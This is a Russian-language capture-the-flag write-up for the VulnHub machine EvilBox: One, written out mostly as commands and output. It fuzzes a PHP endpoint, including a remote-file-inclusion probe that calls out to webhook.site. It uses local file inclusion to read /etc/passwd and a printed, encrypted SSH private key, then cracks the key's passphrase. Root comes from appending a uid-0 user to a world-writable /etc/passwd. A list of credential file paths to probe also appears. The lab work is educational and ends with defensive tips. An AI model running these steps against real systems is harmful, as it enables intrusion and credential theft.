# VulnHub - RSA_Madness-EvilBox:_One

📅 Дата: 2025-05-21  
🧠 Сложность: Easy  
💻 IP-адрес: 192.168.56.122  

---

## 🔍 Сканирование

```bash
export ip=192.168.56.122
sudo nmap -sS -p- $ip | grep -oP "^[0-9]+(?=/tcp\s+open)" | sort -n | paste -sd ","
sudo nmap -sT -Pn -sV -T4 -A -p 22,80 $ip -oN scans/nmap.txt
```

🖼️ Nmap скан:

![nmap scan](screenshots/nmap_scan.png)

---

## 🕵 Enumeration

![http](screenshots/apache.png)

```bash
ffuf -fc 404 -t 100 -u http://$ip/FUZZ \
-w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
secret                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7ms]
```

Дальнейшая вложенность не найдена:

```bash
ffuf -fc 404 -t 100 -u http://$ip/secret/FUZZ \
-w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
```

Поиск endpoint .php:

```bash
ffuf -fc 404 -t 100 -u http://$ip/secret/FUZZ.php \
-w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
evil                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
```

Проверка RFI не дала результатов:

```bash
ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=https://webhook.site/bbd9abff-dfc8-4342-88be-1f98291143da \
-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 0
```

Проверка RCE не дала результатов:

```bash
ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=id \
-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```
```bash
ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=1 \
-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

Проверка LFI:

```bash
ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=../../../../etc/passwd \
-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
command                 [Status: 200, Size: 1455, Words: 13, Lines: 28, Duration: 2ms]
```
![passwd](screenshots/passwd.png)

Проверка ключей, токенов, кредов
```bash
/home/mowree/.bashrc
/home/mowree/.bash_history
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/php/*/apache2/php.ini
/var/www/html/config.php
/var/www/html/db.php
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/proc/self/environ
/proc/version
/etc/crontab
/var/spool/cron/crontabs/mowree
/home/mowree/.ssh/id_rsa
/home/mowree/.ssh/authorized_keys
```
```bash
http://192.168.56.122/secret/evil.php?command=/home/mowree/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne


http://192.168.56.122/secret/evil.php?command=/home/mowree/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```


## 📂 Получение доступа

```bash
ssh2john RSA_Madness/rsa/id_rsa > RSA_Madness/rsa/hash.txt
john RSA_Madness/rsa/hash.txt --wordlist=/media/sf_Exchange/Dictionaries/rockyou.txt
```
```bash
john RSA_Madness/rsa/hash.txt --show                                                
RSA_Madness/rsa/id_rsa:unicorn

1 password hash cracked, 0 left
```
```bash
openssl rsa -in RSA_Madness/rsa/id_rsa -out RSA_Madness/rsa/id_rsa_decrypted
ssh -i RSA_Madness/rsa/id_rsa_decrypted mowree@$ip
```

![passwd](screenshots/ssh_mowree.png)


## ⚙️ Привилегии

```bash
mowree@EvilBoxOne:~$ sudo -l
-bash: sudo: orden no encontrada
mowree@EvilBoxOne:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
mowree@EvilBoxOne:~$ 
```

Есть возможность записи в /etc/passwd:

```bash
mowree@EvilBoxOne:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1461 may 21 15:39 /etc/passwd

mowree@EvilBoxOne:~$ echo "newroot:$(openssl passwd -1 pass):0:0:newroot:/root:/bin/bash" >> /etc/passwd

mowree@EvilBoxOne:~$ su newroot
Contraseña: 
root@EvilBoxOne:/home/mowree# cd /
root@EvilBoxOne:/# ls -la
total 68
drwxr-xr-x  18 root root  4096 ago 16  2021 .
drwxr-xr-x  18 root root  4096 ago 16  2021 ..
lrwxrwxrwx   1 root root     7 ago 16  2021 bin -> usr/bin
drwxr-xr-x   3 root root  4096 ago 16  2021 boot
drwxr-xr-x  17 root root  3180 may 21 13:14 dev
drwxr-xr-x  71 root root  4096 may 21 15:39 etc
drwxr-xr-x   3 root root  4096 ago 16  2021 home
lrwxrwxrwx   1 root root    31 ago 16  2021 initrd.img -> boot/initrd.img-4.19.0-17-amd64
lrwxrwxrwx   1 root root    31 ago 16  2021 initrd.img.old -> boot/initrd.img-4.19.0-14-amd64
lrwxrwxrwx   1 root root     7 ago 16  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 ago 16  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 ago 16  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 ago 16  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 ago 16  2021 lost+found
drwxr-xr-x   3 root root  4096 ago 16  2021 media
drwxr-xr-x   2 root root  4096 ago 16  2021 mnt
drwxr-xr-x   2 root root  4096 ago 16  2021 opt
dr-xr-xr-x 137 root root     0 may 21 13:14 proc
drwx------   3 root root  4096 ago 16  2021 root
drwxr-xr-x  16 root root   500 may 21 15:40 run
lrwxrwxrwx   1 root root     8 ago 16  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 ago 16  2021 srv
dr-xr-xr-x  13 root root     0 may 21 13:14 sys
drwxrwxrwt   9 root root  4096 may 21 16:09 tmp
drwxr-xr-x  13 root root  4096 ago 16  2021 usr
drwxr-xr-x  12 root root  4096 ago 16  2021 var
lrwxrwxrwx   1 root root    28 ago 16  2021 vmlinuz -> boot/vmlinuz-4.19.0-17-amd64
lrwxrwxrwx   1 root root    28 ago 16  2021 vmlinuz.old -> boot/vmlinuz-4.19.0-14-amd64
root@EvilBoxOne:/# cd /root/
root@EvilBoxOne:~# ls -la
total 24
drwx------  3 root root 4096 ago 16  2021 .
drwxr-xr-x 18 root root 4096 ago 16  2021 ..
lrwxrwxrwx  1 root root    9 ago 16  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 ago 16  2021 .bashrc
drwxr-xr-x  3 root root 4096 ago 16  2021 .local
-rw-r--r--  1 root root  148 ago 17  2015 .profile
-r--------  1 root root   31 ago 16  2021 root.txt
root@EvilBoxOne:~# cat root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```


## 🏁 Флаги

- User flag: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
- Root flag: 36QtXfdJWvdC0VavlPIApUbDlqTsBM

---


## 📋 Резюме

🧰 **Инструменты:**  
  - nmap, ffuf, webhook.site, ssh2john, john, openssl

🚨 **Уязвимости, которые удалось обнаружить:**  
  - LFI  
  - Security Missconfiguration  

🛡️ **Советы по защите:**
  - Белый список разрешённых значений для параметра "?command="
  - Права на /etc/passwd должны быть строго 644
